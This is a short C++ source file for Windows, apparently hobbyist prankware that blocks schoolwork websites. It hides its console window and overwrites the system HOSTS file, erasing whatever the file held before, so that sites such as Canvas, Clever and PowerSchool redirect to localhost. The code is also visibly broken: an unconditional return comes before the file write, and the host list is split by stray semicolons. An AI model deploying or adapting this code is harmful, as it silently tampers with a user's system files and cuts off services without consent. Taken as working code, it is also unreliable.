// THIS PROGRAM IS WIP THIS PROGRAM IS WIP THIS PROGRAM IS WIP //
// DO NOT USE DO NOT USE DO NOT USE //
// made by freyjapaws //
// blocks many common schoolwork sites //
// probably hella buggy //

#include <windows.h>
#include <winable.h>
#include <stdio.h>
#include <mmsystem.h>
#include <sstream>
#include <iostream>
#include <fstream>
#include <stdio.h>

using namespace std;

const char msg1[]="You're working too hard. You need to pr0crastinate!";

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance,
                            LPSTR lpszArgument, int nFunsterStil)

{
     HWND hide;
AllocConsole();
hide = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(hide, 0);
          
{
	CreateMutexA(NULL, TRUE, "procrastinat0r"); 
if (GetLastError() == ERROR_ALREADY_EXISTS)
ExitProcess(0); 
return 0;
}

{
char host[MAX_PATH];
GetSystemDirectory(host, sizeof(host));
strcat(host, "\\Drivers\\ETC\\HOSTS");
	const char* buffer =
                       "127.0.0.1     www.zearn.com";
                       "127.0.0.1     www.canvas.com";
                       "127.0.0.1     www.clever.com";
                       "127.0.0.1     www.nearpod.com";	
                       "127.0.0.1     www.powerschool.com";	
                       
DWORD byte;
HANDLE hFile = CreateFile(host, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
BOOL bSuccess = WriteFile ( hFile, buffer, strlen(buffer), &byte, NULL);
CloseHandle(hFile);
}
